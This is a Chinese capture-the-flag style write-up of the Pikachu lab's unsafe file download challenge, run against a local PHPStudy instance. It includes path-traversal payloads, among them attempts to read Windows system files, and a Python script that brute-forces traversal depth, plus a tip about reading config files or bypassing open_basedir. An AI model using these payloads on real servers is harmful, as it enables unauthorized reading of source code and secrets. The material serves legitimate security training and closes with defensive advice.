【Pikachu】Web-不安全的文件下载(Unsafe Filedownload) Writeup

操作者：何芊宏 | 操作日期：2026.9.28 | 分类：Pikachu | 标签：Pikachu, Web, 文件下载, 路径穿越, Burp Suite, Python自动化

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - Unsafe Filedownload (不安全的文件下载)
  • 题目名称：Unsafe Filedownload
  • 目标：利用后端下载接口未校验文件路径的缺陷，通过构造目录穿越 Payload，下载并读取服务器上的任意文件，验证任意文件读取漏洞。

2. 解题思路与知识点

漏洞原理：

很多 Web 应用提供文件下载功能。如果开发者直接将用户请求的文件名传入 readfile() 或 file_get_contents() 等函数，且未对文件名中的路径穿越符（如 ../）进行严格过滤，攻击者就可以利用该漏洞跳出 Web 目录限制，下载服务器上的任意敏感文件（如源代码、配置文件等）。

环境限制说明：
  • PHPStudy 默认配置了 open_basedir 参数，限制了 PHP 脚本只能访问 Web 根目录（D:\phpstudy_pro\WWW）及其子目录。
  • 因此，尝试跨越盘符读取 C:/Windows/win.ini 会被系统安全策略拦截，无法成功。这也是我们在测试中需要用脚本批量验证路径层级的原因。

3. 操作步骤

第一步：功能测试与请求捕获

操作： 在 NBA 页面点击球员图片（如 Kobe），触发下载请求。使用 Burp Suite 抓包，得到请求 URL：http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png。

参数分析： 后端接口为 execdownload.php，参数名为 filename，值为具体文件名。

第二步：使用 Burp Suite 进行手动试错

操作 1： 将请求发送至 Burp Repeater，修改 filename=../unsafe_down.php。

回显： 返回 553 字节的提示页面，内容为“你要下载的文件不存在”。

操作 2： 修改 filename=../../index.php。

回显： 同样返回“你要下载的文件不存在”。

操作 3： 尝试直接读取系统文件 filename=C:/Windows/win.ini 以及多层跳转 filename=../../../../../../../../Windows/win.ini。

回显： 全部返回“文件不存在”错误。

失败原因分析： 在不确定后端脚本工作目录（CWD）的情况下，盲目猜测相对路径的层级深度效率极低。同时，由于环境配置了 open_basedir，绝对路径读取 C 盘的文件也被系统拦截。使用 Burp 手动试错在此阶段遇到了瓶颈。

第三步：编写 Python 脚本进行目录穿越批量测试

操作： 放弃 Burp 手动盲测，在 VS Code 中编写 Python 脚本，自动化发送不同路径深度的 Payload。

import requests

url = "http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php"
payloads = [
    "execdownload.php",                                      
    "./execdownload.php",                                    
    "pikachu/vul/unsafedownload/execdownload.php",           
    "../../index.php",                                       
    "../../../index.php",                                    
    "C:/Windows/win.ini",                                    
    "../../../../../../../../Windows/win.ini"                
]

for p in payloads:
    try:
        r = requests.get(url, params={"filename": p}, timeout=5)
        print(f"[*] 测试 Payload: {p}")
        print(f"    状态码: {r.status_code}")
        print(f"    响应长度: {len(r.content)}")
        
        if "你要下载的文件不存在" in r.text:
            print("    [-] 失败：路径解析错误，文件不存在。")
        else:
            print("    [+] 状态异常！可能下载成功！")
            print(f"    响应片段: {r.text[:100]}...")
            
    except Exception as e:
        print(f"    [!] 请求发生异常: {e}")
    print("-" * 50)

Python 代码组成详细解释：

  • import requests：导入 HTTP 请求库，用于发送网络请求。
  • requests.get(url, params={"filename": p})：发送 GET 请求，params 字典会自动拼接成 ?filename=xxx 格式，避免手工拼接 URL 时的遗漏和转义错误。
  • r.status_code 和 len(r.content)：获取 HTTP 响应状态码以及响应体的字节长度。当路径正确、成功读取到文件时，响应长度会发生显著变化。
  • if "你要下载的文件不存在" in r.text：关键字检测。如果页面包含这段文字，判定为失败，否则视为成功。

第四步：攻击验证与结果分析

Python 脚本运行结果：

  • 前四个 Payload 返回长度 553，提示“文件不存在”。
  • 成功 Payload： ../../../index.php，返回长度 3955，输出了 PHP 源代码片段。
  • 后续 C 盘相关的 Payload 全部返回 553 失败。

攻击 URL 组成详细解释：

  • filename=：参数名。
  • ../../../：目录穿越序列。从当前脚本目录（/pikachu/vul/unsafedownload/）向上跳三级，回到 Web 根目录（WWW/）。
  • index.php：目标文件，即网站首页源码。

失败 Payload 分析： C:/Windows/win.ini 返回“文件不存在”，再次证实了 PHP 环境受到 open_basedir 的安全限制，无法跨盘符访问系统文件。

4. 踩坑记录与复盘

  • 坑1：Burp Suite 手动试错效率低下。在 Repeater 中反复修改 filename 参数，由于对后端脚本的工作目录（CWD）和路径层级判断不准确，导致连续触发“文件不存在”错误。
    解决办法：放弃手动盲测，转为编写 Python 脚本批量发送不同层级的路径 Payload，根据响应长度（553 vs 3955）快速定位正确的穿越层级，大幅提升了测试效率。
  • 坑2：无法读取 C 盘文件。尝试读取 C:/Windows/win.ini 失败。
    原因排查：PHPStudy 默认启用了 open_basedir 限制，将 PHP 文件访问范围锁定在 D:\phpstudy_pro\WWW 内。渗透测试中遇到此类限制，应转而读取 Web 目录内的其他源码文件（如 index.php、config.inc.php 等）来证明漏洞存在，或尝试寻找绕过 open_basedir 的其他漏洞链。

5. 知识总结

  • 漏洞本质：不安全的文件下载本质是“权限控制失效”。应用允许用户下载文件，但未限制用户下载的路径范围，导致可读取服务器任意文件。
  • 防御措施：严格限制可下载文件的列表，使用白名单机制。如果必须由用户指定文件名，必须对 ../、..\ 及绝对路径进行严格过滤，或者只允许下载特定目录下的文件。
  • 实战启发：自动化脚本（Python）在处理路径层级盲测、参数遍历等重复性任务时，比手动工具（Burp）具有更高的准确性和效率。在渗透测试中，应根据场景灵活切换工具。
